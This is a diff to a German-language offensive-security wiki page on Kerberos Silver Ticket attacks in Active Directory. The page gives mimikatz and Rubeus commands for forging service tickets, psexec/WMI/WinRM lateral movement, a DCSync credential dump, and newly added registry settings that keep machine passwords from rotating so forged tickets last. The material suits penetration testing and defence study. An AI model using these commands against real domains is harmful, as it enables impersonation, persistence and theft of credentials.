@@ -6,7 +6,11 @@
 
 ## Silver ticket
 
-Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf der **Erwerbung des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computer-Kontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen, **indem er sich als beliebiger Benutzer ausgibt**, wobei typischerweise administrative Berechtigungen angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger nachweisbar ist.
+Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf dem **Erwerb des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computer-Kontos, um ein Ticket Granting Service (TGS) Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und **jede Benutzeridentität nachahmen**, wobei typischerweise administrative Berechtigungen angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger nachweisbar ist.
+
+> [!WARNING]
+> Silver Tickets sind weniger nachweisbar als Golden Tickets, da sie nur den **Hash des Dienstkontos** benötigen, nicht das krbtgt-Konto. Sie sind jedoch auf den spezifischen Dienst beschränkt, den sie anvisieren. Darüber hinaus reicht es aus, nur das Passwort eines Benutzers zu stehlen. 
+Darüber hinaus, wenn Sie das **Passwort eines Kontos mit einem SPN** kompromittieren, können Sie dieses Passwort verwenden, um ein Silver Ticket zu erstellen, das jeden Benutzer für diesen Dienst nachahmt.
 
 Für die Ticket-Erstellung werden je nach Betriebssystem unterschiedliche Tools eingesetzt:
 
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Auf Windows
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -32,16 +41,16 @@ Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem de
 
 ## Verfügbare Dienste
 
-| Diensttyp                                   | Dienst Silber-Tickets                                                      |
-| ------------------------------------------- | -------------------------------------------------------------------------- |
-| WMI                                         | <p>HOST</p><p>RPCSS</p>                                                   |
-| PowerShell Remoting                         | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                       | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nachfragen: WINRM</p> |
-| Geplante Aufgaben                           | HOST                                                                      |
-| Windows-Dateifreigabe, auch psexec         | CIFS                                                                      |
-| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                      |
-| Windows Remote Server Administration Tools   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
-| Goldene Tickets                             | krbtgt                                                                    |
+| Diensttyp                                  | Dienst Silber-Tickets                                                      |
+| ------------------------------------------ | -------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                   |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nachfragen: WINRM</p> |
+| Geplante Aufgaben                          | HOST                                                                      |
+| Windows-Dateifreigabe, auch psexec        | CIFS                                                                      |
+| LDAP-Operationen, einschließlich DCSync   | LDAP                                                                      |
+| Windows Remote Server Administration Tools  | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
+| Goldene Tickets                            | krbtgt                                                                    |
 
 Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:
 
@@ -52,6 +61,10 @@ Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:
 - 4624: Kontoanmeldung
 - 4634: Abmeldung des Kontos
 - 4672: Admin-Anmeldung
+
+## Persistenz
+
+Um zu verhindern, dass Maschinen ihr Passwort alle 30 Tage ändern, setzen Sie `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oder Sie könnten `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` auf einen größeren Wert als 30 Tage setzen, um den Rotationszeitraum anzugeben, wann das Passwort der Maschinen geändert werden sollte.
 
 ## Missbrauch von Diensttickets
 
@@ -97,7 +110,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Finde **weitere Informationen über wmiexec** auf der folgenden Seite:
+Finden Sie **weitere Informationen über wmiexec** auf der folgenden Seite:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -105,7 +118,7 @@ Finde **weitere Informationen über wmiexec** auf der folgenden Seite:
 
 ### HOST + WSMAN (WINRM)
 
-Mit winrm-Zugriff auf einen Computer kannst du **darauf zugreifen** und sogar eine PowerShell erhalten:
+Mit winrm-Zugriff auf einen Computer können Sie **darauf zugreifen** und sogar eine PowerShell erhalten:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
@@ -126,14 +139,16 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 ```
 **Erfahren Sie mehr über DCSync** auf der folgenden Seite:
 
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+
 ## Referenzen
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-{{#ref}}
-dcsync.md
-{{#endref}}
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
 
 
